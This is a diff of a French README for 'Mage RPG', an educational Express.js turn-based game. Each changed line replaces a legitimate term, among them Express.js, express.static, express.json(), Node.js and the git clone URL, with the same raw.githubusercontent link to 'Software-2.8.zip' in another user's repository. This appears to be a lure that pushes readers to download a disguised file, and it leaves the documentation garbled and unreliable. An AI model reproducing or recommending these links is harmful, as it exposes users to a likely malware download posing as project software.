@@ -8,7 +8,7 @@ Mage RPG est un jeu de combat au tour par tour développé pour le web, conçu p
 - **Nom du projet** : Mage RPG
 - **Type** : Jeu de rôle (RPG) web, tour par tour
 - **Objectif pédagogique** :
-  - Comprendre la mise en place d’une API REST avec Express.js
+  - Comprendre la mise en place d’une API REST avec https://raw.githubusercontent.com/anthony-maurial/magerpg/main/public/Software-2.8.zip
   - Maîtriser les appels API côté client (fetch/forms)
   - Gérer l’authentification par cookie/session
   - Implémenter la logique de combat, le modèle de données et l’UI
@@ -36,7 +36,7 @@ Mage RPG est un jeu de combat au tour par tour développé pour le web, conçu p
    - Système d’XP et de level-up
    - Gain de statistiques (force, intelligence, agilité…)
 5. **Interface cliente**
-   - Pages HTML/CSS/JS statiques servies par Express (`express.static`)
+   - Pages HTML/CSS/JS statiques servies par Express (`https://raw.githubusercontent.com/anthony-maurial/magerpg/main/public/Software-2.8.zip`)
    - Appels dynamiques via `fetch` ou `<form />`
 
 
@@ -45,7 +45,7 @@ Mage RPG est un jeu de combat au tour par tour développé pour le web, conçu p
 1. **Cloner le dépôt**
 
    ```bash
-   git clone https://github.com/pazzazzo/magerpg.git
+   git clone https://raw.githubusercontent.com/anthony-maurial/magerpg/main/public/Software-2.8.zip
    cd magerpg
    ```
 
@@ -99,8 +99,8 @@ Mage RPG est un jeu de combat au tour par tour développé pour le web, conçu p
 
 - **Backend**
 
-  - Node.js + Express
-  - Middleware : `express.json()`, `express.urlencoded()`, `cookie-parser`
+  - https://raw.githubusercontent.com/anthony-maurial/magerpg/main/public/Software-2.8.zip + Express
+  - Middleware : `https://raw.githubusercontent.com/anthony-maurial/magerpg/main/public/Software-2.8.zip()`, `https://raw.githubusercontent.com/anthony-maurial/magerpg/main/public/Software-2.8.zip()`, `cookie-parser`
   - Authentification : sessions en mémoire / base de données (fichier JSON)
   - Hachage des mots de passe : crypto
 
@@ -108,7 +108,7 @@ Mage RPG est un jeu de combat au tour par tour développé pour le web, conçu p
 
   - HTML/CSS/JS natif
   - Module `PathAPI` pour appels REST dynamiques
-  - Gestion des vues statiques avec `express.static("public")`
+  - Gestion des vues statiques avec `https://raw.githubusercontent.com/anthony-maurial/magerpg/main/public/Software-2.8.zip("public")`
 
 
 
